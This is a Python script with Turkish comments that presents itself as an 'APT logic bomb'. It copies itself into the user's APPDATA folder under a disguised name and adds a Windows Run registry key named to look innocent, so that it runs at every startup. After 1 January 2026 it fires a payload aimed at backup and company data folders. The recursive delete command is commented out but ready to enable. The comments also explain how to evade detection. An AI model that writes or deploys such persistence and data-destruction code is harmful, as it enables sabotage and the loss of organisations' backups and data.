import sys
import os
import shutil
import winreg # Windows Kayıt Defteri Kütüphanesi (Gerçek Kütüphane)
from datetime import datetime

print("--- ADVANCED PERSISTENT THREAT (APT) - LOGIC BOMB ---")

def add_persistence():
    """
    Bu fonksiyon, kodu Windows'un 'Otomatik Başlatma' listesine ekler.
    Hackerlar buna 'Persistence' (Kalıcılık) der.
    """
    # 1. Dosyayı Güvenli/Gizli Bir Yere Taşı
    # Genelde AppData klasörü kullanılır çünkü buraya yazmak için Admin yetkisi gerekmez.
    gizli_klasor = os.environ["APPDATA"]
    yeni_dosya_yolu = os.path.join(gizli_klasor, "WindowsSecurityHealth.py") # Masum bir isim
    
    # Şu an çalışan dosyanın yolu
    current_file = os.path.abspath(__file__)
    
    # Dosyayı oraya kopyala (Eğer zaten yoksa)
    if not os.path.exists(yeni_dosya_yolu):
        try:
            shutil.copy2(current_file, yeni_dosya_yolu)
            print(f"[*] Dosya gizli konuma kopyalandı: {yeni_dosya_yolu}")
        except Exception as e:
            print(f"[-] Kopyalama hatası: {e}")
            return # Kopyalayamazsak devam etmeyelim

    # 2. Windows Kayıt Defterine (Registry) Yaz
    # Hedef Anahtar: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        # Kayıt defterini yazma modunda aç
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        
        # Komut: "python.exe" "C:\Users\...\AppData\WindowsSecurityHealth.py"
        # Bu sayede bilgisayar açılınca direkt Python ile çalıştırır.
        command = f'"{sys.executable}" "{yeni_dosya_yolu}"'
        
        # Değeri ayarla (İsim: WindowsHealthCheck - Masum görünsün diye)
        winreg.SetValueEx(key, "WindowsHealthCheck", 0, winreg.REG_SZ, command)
        
        winreg.CloseKey(key)
        print("[+] REGISTRY HACKED: Kalıcılık başarıyla eklendi.")
        print("[+] Artık bilgisayar her açıldığında bu kod çalışacak.")
        
    except Exception as e:
        print(f"[-] Registry hatası: {e}")

def check_trigger():
    # Hedef Tarih: 1 Ocak 2026
    trigger_date = datetime(2026, 1, 1)
    
    print(f"[*] Tarih kontrol ediliyor... Bugün: {datetime.now()}")
    
    if datetime.now() > trigger_date:
        print("[!!!] TETİKLEYİCİ AKTİF! ZAMAN DOLDU.")
        detonate()
    else:
        print("[*] Henüz zamanı değil. Uyku moduna geçiliyor.")
        # Burada kod kapanır ama Registry sayesinde yarın yine çalışır.

def detonate():
    # YÜK (Payload) - Gerçek Silme Komutları
    print("\n--- İMHA PROTOKOLÜ BAŞLATILDI ---")
    
    targets = [r"D:\Yedekler", r"Z:\Sirket_Verileri"] # Örnek yollar
    
    for target in targets:
        # Simüle edilmiş tehlikeli komut (Gerçekte 'del' çalışır)
        print(f"[*] SİLİNİYOR: {target}")
        # os.system(f"del /F /Q /S {target}") 
        
    print("💀 OPERASYON TAMAMLANDI.")

if __name__ == "__main__":
    # Önce kalıcılığı sağla
    add_persistence()
    
    # Sonra tarihi kontrol et
    check_trigger()